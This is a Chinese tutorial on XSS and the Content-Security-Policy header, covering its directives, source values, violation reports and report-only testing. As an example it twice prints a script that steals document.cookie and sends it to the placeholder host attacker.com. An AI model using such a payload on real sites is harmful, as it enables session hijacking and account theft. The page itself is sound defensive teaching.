---
title: 内容安全策略
head:
  - - meta
    - name: description
      content: 内容安全策略（CSP）是一个额外的安全层，用于检测报告并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等。该安全策略通过设置HTTP响应标头中的Content-Security-Policy字段，告诉浏览器哪些来源是受信任的，哪些操作是允许的，从而减少跨站脚本（XSS）攻击的风险。
  - - meta
    - name: keywords
      content: HTTP HTTP安全 XSS 跨站脚本攻击 CSP 内容安全策略 Content-Security-Policy XSS攻击防范手段 对内容安全策略进行测试
---
# XSS攻击？内容安全策略会出手的

XSS（Cross-Site Scripting，跨站脚本攻击，简称XSS）攻击是一种利用网页应用程序的安全漏洞的攻击方式，攻击者通过在网页中注入恶意脚本代码，使其在用户的浏览器中执行。这些恶意脚本可以用来窃取用户的敏感信息、篡改网页内容或进行其他未经授权的操作。

::: tip XSS全称为Cross-Site Scripting，简称为什么是XSS而不是CSS

为什么XSS不简称为CSS，主要是因为CSS已经被广泛用于表示层叠样式表，用于定义网页的样式和布局。为了避免混淆，XSS选择了不同的简称，即"XSS"。

:::

**有小伙伴可能会疑惑："攻击者是怎么向网页注入恶意脚本的？"，我们看下面的例子：**

> 有一个博客网站提供了评论功能，用户评论可以实时渲染到DOM中，但由于该博客并未做用户输入以及渲染到DOM时的数据校验，因此攻击者就可以评论如下内容：
>
> ```js
> <script>
>   // 恶意代码，假设它会窃取用户的Cookie
>   var stolenData = document.cookie;
>   // 将数据发送到攻击者的服务器
>   var img = new Image();
>   img.src = "http://attacker.com/steal.php?data=" 
>                    + encodeURIComponent(stolenData);
> </script>
> ```
>
> 当其他用户浏览评论时，浏览器会执行评论中的JavaScript代码。这个恶意脚本会窃取用户的Cookie数据，并将它发送到攻击者的服务器，攻击者可以在服务器上分析这些Cookie数据，可能用于进一步的攻击，如身份盗窃或会话劫持。

是不是很恐怖，当然聪明的朋友可能会说："那我做好用户输入、客户端渲染的数据校验不就可以了吗？"。确实，**做好用户输入的验证和客户端渲染数据的校验是防止XSS攻击的关键步骤之一**，但不能完全依赖它来确保安全，因为XSS攻击可以非常隐蔽和复杂，比如下面这个例子：

> 有一个在线论坛网站用于用户发表和浏览帖子。它使用了一个开源的Markdown渲染库，该库用于将用户输入的Markdown文本转换为HTML以进行显示。该网站执行了严格的用户输入、数据渲染验证，以确保用户不能直接插入恶意脚本或HTML标签。但其依赖的Markdown渲染库被污染，在某个时刻被攻击者篡改，包含了以下代码：
>
> ```js
> <script>
>   // 恶意代码，假设它会窃取用户的Cookie
>   var stolenData = document.cookie;
>   // 将数据发送到攻击者的服务器
>   var img = new Image();
>   img.src = "http://attacker.com/steal.php?data=" 
>                    + encodeURIComponent(stolenData);
> </script>
> ```
>
> 当用户浏览Markdown时，浏览器会执行第三方库恶意代码。这个恶意脚本会窃取用户的Cookie数据，并将它发送到攻击者的服务器，攻击者可以在服务器上分析这些Cookie数据，可能用于进一步的攻击，如身份盗窃或会话劫持。

上述例子中该网站虽然对用户输入、数据渲染进行了严格的验证，但由于第三方库存在漏洞，导致恶意JavaScript代码被执行。当然，这可以通过**尽量选择受信任的源（如官方仓库或社区维护的库）的依赖，以及定期审查依赖的安全风险来降低XSS攻击的风险**。

从上述两个例子我们可以看到想要防止XSS攻击是极度复杂且困难的，为了提供一种有效的方式来降低XSS攻击风险，W3C推出了一项安全措施——内容安全策略(Content Security Policy ，简称CSP)



## 内容安全策略(Content Security Policy ，简称CSP)

**内容安全策略（CSP）是一个额外的安全层，用于检测报告并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等**。该安全策略通过设置HTTP[响应标头](../overview/http-message-format.md#消息头)中的`Content-Security-Policy`字段，告诉浏览器哪些来源是受信任的，哪些操作是允许的，从而减少跨站脚本（XSS）攻击的风险。

<br>

### Content-Security-Policy`响应标头`

`Content-Security-Policy`（CSP）响应标头用于指定浏览器应该如何处理页面中的内容和资源，告诉浏览器哪些来源是受信任的，哪些操作是允许的，以此增强Web应用程序的安全性，减少或防止跨站脚本攻击（XSS）和其他类型的注入攻击。

<br>

#### 参数

- **font-src < source > < source >...** `可选`

  用于定义通过 @font-face 加载的字体文件的来源

- **img-src < source > < source >...** `可选`

   用于定义图像的来源。

- **media-src < source > < source >...** `可选`

   用于定义< audio>、< video> 或 < track> 标签加载的媒体文件的源地址。

- **object-src < source > < source >...** `可选`

  用于定义< object> 或 < embed>标签加载资源的源地址。

- **style-src < source > < source >...** `可选`

  用于定义CSS样式表的来源。

- **script-src < source > < source >...** `可选`

  用于定义JavaScript代码的来源。

- **connect-src < source > < source >...** `可选`

  用于定义网络连接的来源，包括AJAX请求和WebSocket。

- **manifest-src < source > < source >...** `可选`

  用于定义manifest 文件的来源

- **frame-src < source > < source >...** `可选`

  用于定义< frame> 和 < iframe>加载的内嵌内容的源地址

- **worker-src < source > < source >...** `可选`

  用于定义Worker、SharedWorke 或 ServiceWorker脚本源。

- **child-src < source > < source >...** `可选`

  用于定义 Web Workers 和其他内嵌浏览器内容（例如用< frame>  和 < iframe>加载到页面的内容）的源地址。

- **prefetch-src < source > < source >...** `可选`

  用于定义预加载或预渲染的源地址。

- **webrtc-src < source > < source >...** `可选` `实验中`

  用于定义WebRTC连接的源地址。

- **default-src < source > < source >...** `可选`

  用于定义默认内容的源地址，默认内容指未明确指定其来源的内容

- **base-uri < source > < source >...** `可选`

  用于定义 DOM 中 < base> 元素可以使用的 URL。

- **sandbox < value> < value>...** `可选`

  用于定义 iframe 中的行为和权限，与< ifame>元素中sandbox属性一致

- **form-action< source > < source >...** `可选`

  用于定义当前页面中表单的提交地址。

- **frame-ancestors < source > < source >...** `可选`

  用于定义哪些网页可以使用 iframe、frame、object、embed 等元素嵌套显示当前页面

  ::: danger  X-Frame-Options 响应标头已弃用，已被CSP中的frame-ancestors属性代替

  **`X-Frame-Options`** 响应头是用来给浏览器指示允许一个页面可否在iframe、frame、object、embed 等元素中展现。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免[点击劫持 ](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks)攻击。

  它有以下三个取值：

  - **DENY**：表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。

  - **SAMEORIGIN**：表示该页面可以在相同域名页面的 frame 中展示。
  - **ALLOW-FROM < uri>**：页面可以在指定来源的 frame 中展示。

  目前该响应标头已被CSP中的frame-ancestors代替，但其仍然可以为尚不支持CSP的旧版浏览器的用户提供保护。

  :::

- **block-all-mixed-content** `可选`

  指定该参数表明当使用 HTTPS 加载页面时阻止使用 HTTP 加载任何资源。

- **upgrade-insecure-requests** `可选`

  指定该参数表明把当前网页中所有不安全的URL(HTTP的URL)通过HTTPS访问

<br>

#### < source >取值

上述参数中< srouce >取值如下：

- **< host-source >** ：以域名或者 IP 地址表示的主机名，外加可选的 URL 协议名以及端口号。站点地址中可能会包含一个可选的前置通配符（星号 ' * '），同时也可以将通配符（也是'*'）应用于端口号，表示在这个源中可以使用任意合法的端口号。 
- **< scheme-source >** ：表示URL协议名要相同，例如：`https:`、`data:`、`mediastream:`、`blob:`、`filesystem:`（冒号是必须的）
- **'self'** ：表示同源，包括协议名和端口号都要相同（单引号是必须的）
- **'unsafe-inline'** ：允许使用内联资源，例如内联< script >元素、javascript:URL、内联事件处理程序和内联< style >元素（单引号是必须的）
- **'unsafe-eval'** ：允许使用`eval()`和其他不安全的方法从字符串创建代码（单引号是必须的）
- **'wasm-unsafe-eval'** ：允许加载和执行 WebAssembly 模块，并且无需允许`'unsafe-eval'`（单引号是必须的）
- **'unsafe-hashes'** ：允许启用特定的内联事件处理程序(例如 `onclick`、`onload`、`onmouseover` 等)。如果您只是不允许内联< script >元素或javascript:URL，那么这是比使用`unsafe-inline`表达式更安全的方法（单引号是必须的）
- **'none'** ：不允许任何内容（单引号是必须的）
- **'nonce-< base64-value >'** ：使用这个指令，你可以为每个内联脚本分配一个唯一的 nonce 值，并在 CSP 头部中指定这些 nonce 值，只有具有正确 nonce 值的内联脚本才会被执行（单引号是必须的）
- **'< hash-algorithm >-< base64-value >'** ：该指令为每个内联脚本生成哈希值，并在 CSP 头部中列出这些哈希值，只有与 CSP 头部中列出的哈希值匹配的内联脚本才会被执行（单引号是必须的）
- **'strict-dynamic'** ：它告诉浏览器在内联脚本执行时，只允许加载和执行来自同一源（同源）的外部脚本（单引号是必须的）
- **'report-sample'** ：要求在违规报告中包含违规代码示例（单引号是必须的）

:::tip 除了使用`Content-Security-Policy`响应标头，还可以使用< meta >元素来配置该策略

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src https://*; child-src 'none';" />
```

meta元素的http-equiv属性赋值为Content-Security-Policy即可配置该策略，content即为策略参数，与`Content-Security-Policy`响应标头的参数一致

:::

<br>

#### 示例

```http
// 禁用不安全的内联/动态执行，只允许通过 https 加载这些资源（如图片、字体、脚本等）
Content-Security-Policy: default-src https:

<meta http-equiv="Content-Security-Policy" content="default-src https:">


// 资源只从 https 加载，允许使用`eval()`，允许使用内联资源，并且禁止插件
Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'

<meta http-equiv="Content-Security-Policy" content="default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'">

```



:::danger  早期的内容安全策略：**`X-XSS-Protection`** 响应头

 **`X-XSS-Protection`** 响应头是 Internet Explorer，Chrome 和 Safari 的一个特性，当检测到跨站脚本攻击 (XSS) 时，浏览器将停止加载页面。若网站设置了良好的 `Content-Security-Policy`来禁用内联 JavaScript (`'unsafe-inline'`)，现代浏览器不太需要这些保护，但其仍然可以为尚不支持 CSP的旧版浏览器的用户提供保护。

它有以下四个取值：

- **0**：禁止 XSS 过滤。
- **1**：启用 XSS 过滤（通常浏览器是默认的）。如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。
- **1;mode=block**：启用 XSS 过滤。如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。
- **1; report=< reporting-URI >**(仅chromium可用)：启用 XSS 过滤。如果检测到跨站脚本攻击，浏览器将清除页面并发送违规报告。

:::

<br>

#### 违规报告

支持 CSP 的浏览器将始终对于每个企图违反你所建立的策略都发送违规报告，如果策略里包含一个有效的`report-uri` 参数

**启用报告**

为启用发送违规报告，你需要指定`report-to`参数，并提供至少一个 URI 地址去递交报告：

```http
Content-Security-Policy: default-src 'self'; report-uri 
http://reportcollector.example.com/collector.cgi
```

**违规报告的内容**

违规报告将 JSON 对象发送给`report-to`参数指定的地址，它包含了以下数据：

- **blocked-uri** ：被 CSP 阻止的资源 URI。如果被阻止的 URI 来自不同的源而非 `document-uri`，那么被阻止的资源 URI 会被删减，仅保留协议、主机和端口号。
- **disposition** ：根据 `Content-Security-Policy-Report-Only`和 `Content-Security-Policy` 标头使用情况的不同，值为 `"enforce"` 或 `"report"`。
- **document-uri** ：发生违规的文档的 URI。
- **effective-directive** ：导致违规行为发生的指令。一些浏览器可能提供不同的值，例如 Chrome 提供 `style-src-elem` 或 `style-src-attr`，即使实际执行的指令是 `style-src`。
- **original-policy** ：由 `Content-Security-Policy` HTTP 标头指定的原始策略值。
- **referrer** `已删除` ：违规发生处的文档引用（地址）。
- **script-sample** ：导致该违规的内联代码、事件处理器或样式的前 40 个字符。只适用于 `script-src*` 或 `style-src*` 包含 `'report-sample'` 的情况。
- **status-code** ：全局对象被实例化的资源的 HTTP 状态代码。
- **violated-directive** `已删除` ：导致违反策略的指令。`violated-directive` 是 `effective-directive` 字段的历史名称，并包含相同的值。

```json
// 样式
{
  "csp-report": {
    "blocked-uri": "http://example.com/css/style.css",
    "disposition": "report",
    "document-uri": "http://example.com/signup.html",
    "effective-directive": "style-src-elem",
    "original-policy": "default-src 'none'; style-src cdn.example.com; report-to /_/csp-reports",
    "referrer": "",
    "status-code": 200,
    "violated-directive": "style-src-elem"
  }
}

```

<br>

## 对内容安全策略进行测试

由于内容安全策略会禁用一些脚本，如果配置不当贸然上线可能会导致一些重要脚本无法执行，从而导致不可预估的后果。**因此 CSP 可用通过设置`Content-Security-Policy-Report-Only`响应标头将策略部署为仅报告（report-only）模式，在此模式下，CSP 策略不是强制性的，但是任何违规行为将会发送给`report-uri`参数指定的地址。此外，仅报告标头可以用来测试对策略未来的修订，而不用实际部署它**。

`Content-Security-Policy-Report-Only`与`Content-Security-Policy`拥有完全一样的参数，只不过前者不强制执行策略，而后者是强制执行策略的。如果两者同时出现在一个响应中，两个策略均有效。在 `Content-Security-Policy` 标头中指定的策略有强制性，而 `Content-Security-Policy-Report-Only` 中的策略仅产生报告而不具有强制性。

<br>





##  XSS攻击防范手段

- **用户输入数据以及动态渲染用户输入数据时要严格验证、过滤以及转义**

  确保用户提交的数据符合预期的格式和类型，拒绝不合法的输入，在将用户输入插入到HTML、JavaScript、CSS或其他上下文中之前，要对数据进行严格验证、过滤以及转义，防止浏览器将输入识别为可执行脚本。

- **切勿滥用任何动态渲染、插入、执行js、css以及html的方法，慎用任何序列以及反序列化的方法**

  在使用上述方法时一定要仔细思考是否一定要使用这些方法才能满足需求，如若不是最好不要使用，非要使用一定要仔细验证数据来源是否已经经过严格的验证、过滤以及转义。

- **选择受信任的源（如官方仓库或社区维护的库）的依赖，定期审查项目依赖的安全风险**

  避免使用来自不明来源、未经验证或不活跃维护的依赖项，因为这些依赖项可能包含安全漏洞，项目依赖需要定期监控和更新，因为漏洞和安全问题可能随着时间而出现。

- **使用内容安全策略（CSP）**

  使用CSP指定浏览器应该如何处理页面中的内容和资源，告诉浏览器哪些来源是受信任的，哪些操作是允许的，以此增强Web应用程序的安全性，减少或防止跨站脚本攻击（XSS）和其他类型的注入攻击。

  

::: details  🎈本节参考

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP

https://developer.mozilla.org/zh-CN/docs/Glossary/CSP

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/font-src

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources

:::



转载需要经过本人同意，并标明出处！